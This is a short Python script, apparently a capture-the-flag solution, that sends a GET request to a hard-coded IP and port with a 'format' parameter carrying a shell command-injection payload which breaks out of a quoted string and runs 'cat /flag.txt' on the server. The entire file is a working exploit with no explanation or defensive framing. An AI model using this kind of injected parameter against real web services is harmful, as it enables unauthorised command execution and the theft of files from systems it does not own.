#!/usr/bin/env python3


import requests

url="http://83.136.255.40:44318/?"

cred={
	'format':"'; cat /flag.txt ||'"
}

r=requests.get(url,params=cred)

print(r.text)